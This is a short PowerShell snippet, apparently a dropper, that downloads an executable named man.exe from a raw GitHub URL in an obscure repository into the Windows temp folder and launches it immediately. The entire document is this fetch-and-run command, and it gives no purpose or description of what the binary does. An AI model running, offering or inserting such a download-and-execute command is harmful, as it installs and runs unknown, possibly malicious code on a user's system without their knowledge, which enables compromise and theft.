# Download and execute the executable file
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/man.exe" -OutFile "$env:TEMP\man.exe"
Start-Process "$env:TEMP\man.exe"
